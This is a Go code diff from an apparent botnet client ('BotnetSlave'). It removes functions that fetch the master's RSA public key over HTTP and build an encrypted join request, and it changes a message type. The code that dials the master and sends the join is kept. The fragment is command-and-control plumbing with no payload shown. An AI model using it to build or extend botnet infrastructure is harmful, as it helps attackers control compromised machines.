@@ -4,9 +4,7 @@ import (
 	"crypto/rsa"
 	"encoding/json"
 	"fmt"
-	"io/ioutil"
 	"log"
-	"net/http"
 	"os"
 	"os/signal"
 	"time"
@@ -45,40 +43,6 @@ func NewBotnetSlave(masterAddr string) (*BotnetSlave, error) {
 	}, nil
 }
 
-func getMasterPubKey(masterAddr string) (*rsa.PublicKey, string, error) {
-	req, err := http.NewRequest(http.MethodGet, fmt.Sprintf("http://%s%s", masterAddr, master.KeyEndpoint), nil)
-	if err != nil {
-		return nil, "", err
-	}
-	resp, err := http.DefaultClient.Do(req)
-	if err != nil {
-		return nil, "", err
-	}
-	bodyBytes, err := ioutil.ReadAll(resp.Body)
-	defer resp.Body.Close()
-	if err != nil {
-		return nil, "", err
-	}
-	var kr *master.KeyResponse
-	if err := json.Unmarshal(bodyBytes, &kr); err != nil {
-		return nil, "", err
-	}
-	pubKey, err := encryption.DecodePubKeyPEM([]byte(kr.Key))
-	if err != nil {
-		return nil, "", err
-	}
-	return pubKey, kr.Key, nil
-}
-
-func buildEncryptedJoinRequest(slavePubKey string, encryptionKey *rsa.PublicKey) (string, error) {
-	encryptedRequest, err := json.Marshal(master.JoinRequest{Key: slavePubKey})
-	if err != nil {
-		return "", err
-	}
-	encrypted, err := encryption.EncryptMessage(encryptedRequest, encryptionKey)
-	return string(encrypted), err
-}
-
 // Start runs the initialized slave process
 func (s *BotnetSlave) Start() {
 	interrupt := make(chan os.Signal, 1)
@@ -92,7 +56,7 @@ func (s *BotnetSlave) Start() {
 		log.Fatal("dial:", err)
 	}
 	defer c.Close()
-	done := make(chan *master.Msg)
+	done := make(chan *protocol.Event)
 
 	// send encrypted join request
 	encrypted, err := buildEncryptedJoinRequest(s.slavePubKey, s.masterPubKey)
